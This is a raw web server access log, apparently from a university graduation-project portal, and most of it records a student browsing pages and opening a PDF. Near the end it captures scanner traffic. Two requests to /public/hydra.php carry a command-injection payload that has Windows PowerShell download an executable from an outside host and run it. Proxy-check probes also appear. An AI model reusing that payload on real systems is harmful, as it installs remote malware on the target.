118.31.244.58 - - [28/May/2019:00:00:56 +0800] "GET / HTTP/1.0" 200 11398
113.200.219.2 - - [28/May/2019:18:54:28 +0800] "POST /bysj/Stu/queryTInfo HTTP/1.1" 200 416
113.200.219.2 - - [28/May/2019:18:54:33 +0800] "GET /bysj/toProcess HTTP/1.1" 200 1560
113.200.219.2 - - [28/May/2019:18:54:33 +0800] "GET /bysj/js/normalProcess.js HTTP/1.1" 200 1730
113.200.219.2 - - [28/May/2019:18:54:33 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/search.png HTTP/1.1" 200 813
113.200.219.2 - - [28/May/2019:18:54:33 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 2929
113.200.219.2 - - [28/May/2019:18:54:35 +0800] "GET /bysj/toTopic HTTP/1.1" 200 4094
113.200.219.2 - - [28/May/2019:18:54:36 +0800] "GET /bysj/js/student/topic.js HTTP/1.1" 200 5131
113.200.219.2 - - [28/May/2019:18:54:36 +0800] "GET /bysj/js/student/topicSApply.js HTTP/1.1" 200 1556
113.200.219.2 - - [28/May/2019:18:54:36 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/edit_add.png HTTP/1.1" 200 1088
113.200.219.2 - - [28/May/2019:18:54:36 +0800] "POST /bysj/Stu/queryDTopic HTTP/1.1" 200 2329
113.200.219.2 - - [28/May/2019:18:54:37 +0800] "GET /bysj/toTopicResult HTTP/1.1" 200 1213
113.200.219.2 - - [28/May/2019:18:54:37 +0800] "GET /bysj/js/student/topicResult.js HTTP/1.1" 200 5159
113.200.219.2 - - [28/May/2019:18:54:38 +0800] "POST /bysj/Stu/queryTopicResult HTTP/1.1" 200 511
113.200.219.2 - - [28/May/2019:18:54:48 +0800] "GET /bysj/toUpload HTTP/1.1" 200 3015
113.200.219.2 - - [28/May/2019:18:54:48 +0800] "GET /bysj/js/student/sUpload.js HTTP/1.1" 200 1206
113.200.219.2 - - [28/May/2019:18:54:48 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
113.200.219.2 - - [28/May/2019:18:54:49 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
113.200.219.2 - - [28/May/2019:18:54:49 +0800] "GET /bysj/js/student/sRead.js HTTP/1.1" 200 4154
113.200.219.2 - - [28/May/2019:18:54:49 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "GET /bysj/toSG HTTP/1.1" 200 3219
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "GET /bysj/js/student/sG.js HTTP/1.1" 200 2899
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "POST /bysj/Stu/querySG HTTP/1.1" 200 471
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "GET /bysj/toScore HTTP/1.1" 200 1185
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "GET /bysj/js/student/sScore.js HTTP/1.1" 200 1863
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "POST /bysj/Stu/querySScore HTTP/1.1" 200 552
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "GET /bysj/toSpeechGroup HTTP/1.1" 200 1203
113.200.219.2 - - [28/May/2019:18:54:52 +0800] "GET /bysj/js/student/sSpeechGroup.js HTTP/1.1" 200 927
113.200.219.2 - - [28/May/2019:18:54:53 +0800] "POST /bysj/Stu/querySSpeechGroup HTTP/1.1" 200 226
113.200.219.2 - - [28/May/2019:18:55:37 +0800] "GET /bysj/userInfo HTTP/1.1" 200 1718
113.200.219.2 - - [28/May/2019:18:55:38 +0800] "GET /bysj/userInfoEditPage HTTP/1.1" 200 2901
113.200.219.2 - - [28/May/2019:18:56:13 +0800] "GET /bysj/userPasswordEditPage HTTP/1.1" 200 2315
113.200.219.2 - - [28/May/2019:18:56:14 +0800] "GET /bysj/toGroupInfo HTTP/1.1" 200 1305
113.200.219.2 - - [28/May/2019:18:56:14 +0800] "POST /bysj/Stu/querySGroupInfo HTTP/1.1" 200 1276
113.200.219.2 - - [28/May/2019:18:56:14 +0800] "POST /bysj/Stu/queryTInfo HTTP/1.1" 200 416
113.200.219.2 - - [28/May/2019:18:56:33 +0800] "GET /bysj/toProcess HTTP/1.1" 200 1560
113.200.219.2 - - [28/May/2019:18:56:33 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 2929
113.200.219.2 - - [28/May/2019:18:56:44 +0800] "GET /bysj/toSG HTTP/1.1" 200 3266
113.200.219.2 - - [28/May/2019:18:56:44 +0800] "POST /bysj/Stu/querySG HTTP/1.1" 200 471
113.200.219.2 - - [28/May/2019:18:56:48 +0800] "GET /bysj/toScore HTTP/1.1" 200 1185
113.200.219.2 - - [28/May/2019:18:56:48 +0800] "POST /bysj/Stu/querySScore HTTP/1.1" 200 552
113.200.219.2 - - [28/May/2019:18:56:52 +0800] "GET /bysj/toSpeechGroup HTTP/1.1" 200 1203
113.200.219.2 - - [28/May/2019:18:56:52 +0800] "POST /bysj/Stu/querySSpeechGroup HTTP/1.1" 200 226
113.200.219.2 - - [28/May/2019:18:57:26 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 1640
113.200.219.2 - - [28/May/2019:18:57:29 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 730
113.200.219.2 - - [28/May/2019:18:57:35 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 1640
113.200.219.2 - - [28/May/2019:18:57:39 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 2929
113.200.219.2 - - [28/May/2019:18:57:41 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 1640
113.200.219.2 - - [28/May/2019:18:57:43 +0800] "POST /bysj/queryProcess HTTP/1.1" 200 730
113.200.219.2 - - [28/May/2019:18:58:16 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
113.200.219.2 - - [28/May/2019:18:58:16 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
113.200.219.2 - - [28/May/2019:18:58:20 +0800] "GET /bysj/toUpload HTTP/1.1" 200 3015
113.200.219.2 - - [28/May/2019:18:59:11 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.html?file=/doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 200 19600
113.200.219.2 - - [28/May/2019:18:59:11 +0800] "GET /bysj/js/pdfjs/generic/web/compatibility.js HTTP/1.1" 200 17788
113.200.219.2 - - [28/May/2019:18:59:11 +0800] "GET /bysj/js/pdfjs/generic/web/l10n.js HTTP/1.1" 200 29253
113.200.219.2 - - [28/May/2019:18:59:11 +0800] "GET /bysj/js/pdfjs/generic/web/debugger.js HTTP/1.1" 200 19583
113.200.219.2 - - [28/May/2019:18:59:12 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.css HTTP/1.1" 200 46022
113.200.219.2 - - [28/May/2019:18:59:14 +0800] "GET /bysj/js/pdfjs/generic/build/pdf.js HTTP/1.1" 200 261214
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.js HTTP/1.1" 200 249596
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/texture.png HTTP/1.1" 200 2418
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-viewThumbnail.png HTTP/1.1" 200 185
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-viewOutline.png HTTP/1.1" 200 178
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-viewAttachments.png HTTP/1.1" 200 384
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-sidebarToggle.png HTTP/1.1" 200 225
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-search.png HTTP/1.1" 200 309
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-pageUp.png HTTP/1.1" 200 246
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-print.png HTTP/1.1" 200 257
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-download.png HTTP/1.1" 200 259
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-pageDown.png HTTP/1.1" 200 238
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-presentationMode.png HTTP/1.1" 200 321
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-menuArrows.png HTTP/1.1" 200 108
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-secondaryToolbarToggle.png HTTP/1.1" 200 243
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-openFile.png HTTP/1.1" 200 295
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-zoomOut.png HTTP/1.1" 200 88
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-bookmark.png HTTP/1.1" 200 174
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-zoomIn.png HTTP/1.1" 200 136
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/locale/locale.properties HTTP/1.1" 200 4314
113.200.219.2 - - [28/May/2019:18:59:15 +0800] "GET /bysj/js/pdfjs/generic/web/locale/zh-CN/viewer.properties HTTP/1.1" 200 6259
113.200.219.2 - - [28/May/2019:18:59:24 +0800] "GET /bysj/js/pdfjs/generic/build/pdf.worker.js HTTP/1.1" 200 1251607
113.200.219.2 - - [28/May/2019:18:59:24 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 200 1015661
113.200.219.2 - - [28/May/2019:18:59:24 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 65536
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 32621
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 65536
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /bysj/js/pdfjs/generic/web/images/shadow.png HTTP/1.1" 200 290
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /bysj/js/pdfjs/generic/web/images/loading-small.png HTTP/1.1" 200 7402
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 131072
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /bysj/js/pdfjs/generic/web/images/loading-icon.gif HTTP/1.1" 200 2545
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 65536
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 327680
113.200.219.2 - - [28/May/2019:18:59:25 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 131072
113.200.219.2 - - [28/May/2019:18:59:30 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 65536
113.200.219.2 - - [28/May/2019:18:59:30 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 65536
113.200.219.2 - - [28/May/2019:18:59:30 +0800] "GET /doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 206 196608
113.200.219.2 - - [28/May/2019:18:59:55 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
113.200.219.2 - - [28/May/2019:18:59:55 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
113.200.219.2 - - [28/May/2019:19:00:35 +0800] "GET /bysj/toTopic HTTP/1.1" 200 4092
113.200.219.2 - - [28/May/2019:19:00:35 +0800] "POST /bysj/Stu/queryDTopic HTTP/1.1" 200 2329
113.200.219.2 - - [28/May/2019:19:00:43 +0800] "GET /bysj/toTopicResult HTTP/1.1" 200 1213
113.200.219.2 - - [28/May/2019:19:00:43 +0800] "POST /bysj/Stu/queryTopicResult HTTP/1.1" 200 511
185.232.21.29 - - [28/May/2019:19:06:37 +0800] "-" 400 -
185.232.21.29 - - [28/May/2019:19:06:37 +0800] "-" 400 -
47.105.122.27 - - [28/May/2019:19:21:40 +0800] "GET null null" 400 -
47.105.122.27 - - [28/May/2019:19:21:40 +0800] "GET null null" 400 -
47.105.122.27 - - [28/May/2019:19:21:40 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe');start%20%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe HTTP/1.1" 404 983
80.82.70.187 - - [28/May/2019:20:54:49 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
194.61.24.202 - - [28/May/2019:21:13:54 +0800] "-" 400 -
64.126.175.158 - - [28/May/2019:21:44:01 +0800] "GET / HTTP/1.1" 200 11418
89.248.169.12 - - [28/May/2019:21:52:32 +0800] "GET / HTTP/1.1" 200 11418
95.213.187.187 - - [28/May/2019:22:12:05 +0800] "POST /azenv.php?auth=155905272577709&a=PC&i=795451163&p=8080 HTTP/1.1" 404 969
95.213.187.190 - - [28/May/2019:22:12:10 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 -
95.213.187.187 - - [28/May/2019:22:12:15 +0800] "-" 400 -
95.213.187.188 - - [28/May/2019:22:12:21 +0800] "-" 400 -
151.234.238.137 - - [28/May/2019:22:14:06 +0800] "GET / HTTP/1.1" 200 11418
120.132.3.65 - - [28/May/2019:23:54:03 +0800] "-" 400 -
120.132.3.65 - - [28/May/2019:23:54:03 +0800] "-" 400 -
120.132.3.65 - - [28/May/2019:23:54:03 +0800] "GET /404/search_children.js HTTP/1.1" 404 995
47.105.122.27 - - [28/May/2019:23:59:18 +0800] "GET null null" 400 -
47.105.122.27 - - [28/May/2019:23:59:18 +0800] "GET null null" 400 -
47.105.122.27 - - [28/May/2019:23:59:18 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe');start%20%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe HTTP/1.1" 404 983
